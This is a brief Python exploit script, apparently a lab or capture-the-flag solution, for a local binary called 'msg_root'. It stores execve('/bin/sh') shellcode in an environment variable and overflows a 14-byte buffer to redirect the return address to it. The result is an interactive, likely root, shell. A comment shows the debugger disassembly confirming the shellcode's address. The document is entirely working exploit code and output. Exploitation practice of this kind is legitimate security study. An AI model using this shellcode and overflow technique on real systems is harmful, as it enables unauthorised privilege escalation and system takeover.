#!/usr/bin/python3
from pwn import process, p32

# execve("/bin/sh", NULL, NULL);
shellcode = b"\x6a\x0b\x58\x6a\x68\x66\x68\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x99\xcd\x80"
env = {"SHELLCODE": shellcode}

offset = 14
junk = b"A" * offset

payload  = b""
payload += junk
payload += p32(0xffffdfd7) # shellcode addr

shell = process(["./msg_root", payload, "message"], env=env)
shell.interactive()

"""
❯ ./getenvaddr SHELLCODE ./msg_root
SHELLCODE will be at 0xffffdfd7

pwndbg> x/9i 0xffffdfd7
=> 0xffffdfd7:	push   0xb
   0xffffdfd9:	pop    eax
   0xffffdfda:	push   0x68
   0xffffdfdc:	pushw  0x732f
   0xffffdfe0:	push   0x6e69622f
   0xffffdfe5:	mov    ebx,esp
   0xffffdfe7:	xor    ecx,ecx
   0xffffdfe9:	cdq
   0xffffdfea:	int    0x80
pwndbg>
"""
